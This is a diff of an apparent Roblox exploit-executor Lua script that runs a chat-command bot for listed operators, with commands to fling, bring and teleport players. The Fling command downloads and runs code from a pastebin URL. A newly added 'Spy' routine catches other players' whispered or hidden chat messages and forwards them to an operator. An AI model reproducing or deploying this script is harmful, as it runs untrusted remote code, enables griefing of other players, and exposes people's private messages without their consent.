@@ -1,11 +1,14 @@
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+local lPlayer = Players.LocalPlayer
 
 local Ops = {[4089251764] = true}
 local skipping = false
 
+local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
+
 local function GetRoot()
-	local character = LocalPlayer.Character
+	local character = lPlayer.Character
 	local hrp = character:WaitForChild("HumanoidRootPart")
 	
 	return hrp
@@ -146,12 +149,10 @@ local function Fling(speaker, raw)
 	if not Ops[speaker.UserId] then return end
 	local targetRaw = Trim(raw:sub(7) or "")
 	if targetRaw == "" then 
-		print("dfj")
 		loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
 		return
 	end
 
-	print("df")
 	local targetPlayer = GetPlayer(targetRaw)
 	if targetPlayer then
 		getgenv().Target = targetPlayer
@@ -161,33 +162,92 @@ local function Fling(speaker, raw)
 end
 
 
+local function Safe(speaker, raw)
+	if not Ops[speaker.UserId] then return end
+
+	local safePart = workspace:FindFirstChild("SafePart")
+	if not safePart then
+		safePart = Instance.new("Part")
+		safePart.Parent = workspace
+		safePart.Name = "SafePart"
+		safePart.Size = Vector3.new(10, 3, 10)
+		safePart.Position = Vector3.new(0, 10000, 0)
+		safePart.Anchored = true
+	end
+
+	local root = GetRoot()
+	if root then
+		local pos = safePart.Position + Vector3.new(0, safePart.Size.Y / 2 + 3, 0)
+		root.CFrame = CFrame.new(pos)
+	end
+end
+
+local receivers = {}
+
+local function Spy(speaker, raw)
+	if not Ops[speaker.UserId] then return end
+	
+	if table.find(receivers, speaker.Name) then
+		table.remove(receivers, speaker.Name)
+	else
+		table.insert(receivers, speaker.Name)
+	end
+	
+	print(receivers)
+end
+
+local function checkHidden(speaker, message)
+	if speaker.Name == lPlayer.Name then return end
+	
+	message = message:gsub("[\n\r]", ""):gsub("\t", " "):gsub(" +", " ")
+	local hidden = true
+	local conn = getmsg.OnClientEvent:Connect(function(packet, channel)
+		if packet.SpeakerUserId == speaker.UserId and packet.Message == message:sub(#message - #packet.Message + 1) then
+			hidden = false
+		end
+	end)
+	wait(1)
+	conn:Disconnect()
+
+	if hidden then
+		saymsg:FireServer("/w ".. receivers[1] .. "{SPY} [".. speaker.Name .."]: "..message)
+	end
+end
+
+
 local function PlayerChatted(speaker, message)
-	if message == ":stop" then
+	checkHidden(speaker, message)
+	
+	if message == "/stop" then
 		Stop(speaker)
 		return
 	end
-	if message:sub(1,5) == ":skip" then
+	if message:sub(1,5) == "/skip" then
 		Skip(speaker, message)
 		return
 	end
-	if message:sub(1,4) == ":op " or message == ":op" then
+	if message:sub(1,4) == "/op " or message == "/op" then
 		Op(speaker, message)
 		return
 	end
-	if message:sub(1,6) == ":deop " or message == ":deop" then
+	if message:sub(1,6) == "/deop " or message == "/deop" then
 		Deop(speaker, message)
 		return
 	end
-	if message:sub(1,7) == ":bring " or message == ":bring" then
+	if message:sub(1,7) == "/bring " or message == "/bring" then
 		Bring(speaker, message)
 		return
 	end
-	if message:sub(1,10) == ":bringbot " or message == ":bringbot" then
+	if message:sub(1,10) == "/bringbot " or message == "/bringbot" then
 		BringBot(speaker, message)
 		return
 	end
-	if message:sub(1,7) == ":fling " or message == ":fling" then
+	if message:sub(1,7) == "/fling " or message == "/fling" then
 		Fling(speaker, message)
+		return
+	end
+	if message:sub(1,5) == "/safe" then
+		Safe(speaker, message)
 		return
 	end
 end
